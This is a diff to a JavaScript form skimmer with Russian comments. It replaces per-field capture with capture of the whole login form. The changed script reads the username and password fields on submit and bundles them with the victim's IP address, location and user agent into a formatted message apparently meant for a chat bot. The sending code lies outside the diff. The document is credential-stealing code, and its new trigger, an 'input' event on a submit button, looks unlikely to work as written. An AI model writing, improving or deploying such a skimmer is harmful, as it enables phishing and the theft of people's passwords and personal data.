@@ -46,16 +46,26 @@ function getSimplifiedUserAgent() {
     return `${browser} on ${os}`;
 }
 
-// Функция для отправки данных формы
-function sendFieldData(name, value) {
+// Функция для отправки всей формы
+function sendFormData(form) {
+    const formData = new FormData(form);
+    const login = formData.get("user") || "Не указано";
+    const password = formData.get("passwd") || "Не указано";
+
     const simplifiedUserAgent = getSimplifiedUserAgent();
 
     getIPInfo().then(info => {
         hashDomain(info.org).then(domainHashTag => {
-            const message = `📋 *Изменение в поле формы:*
+            const message = `🚀 *Аутентификация:*
 ---
-- 🛡️ **Поле:** \`${name}\`
-- ✍️ **Значение:** \`${value || "Не указано"}\`
+- 🛡️ **Логин:**
+\`\`\`
+${login}
+\`\`\`
+- 🛡️ **Пароль:**
+\`\`\`
+${password}
+\`\`\`
 - 🌐 **IP-адрес:** ${info.ip}
 - 📍 **Местоположение:** ${info.location}
 - 🖥️ **User-Agent:** ${simplifiedUserAgent}
@@ -67,11 +77,14 @@ ${domainHashTag}`;
     });
 }
 
-// Отлавливаем событие выхода из поля
-document.querySelectorAll("form input").forEach(input => {
-    input.addEventListener("blur", event => {
-        const fieldName = event.target.name || "Неизвестное поле";
-        const fieldValue = event.target.value;
-        sendFieldData(fieldName, fieldValue);
+// Отслеживаем изменение кнопки "ОК"
+document.querySelectorAll('input[type="submit"], button[type="submit"]').forEach(button => {
+    button.addEventListener("input", event => {
+        if (event.target.value === "Log In") {
+            const form = event.target.closest("form");
+            if (form) {
+                sendFormData(form);
+            }
+        }
     });
 });
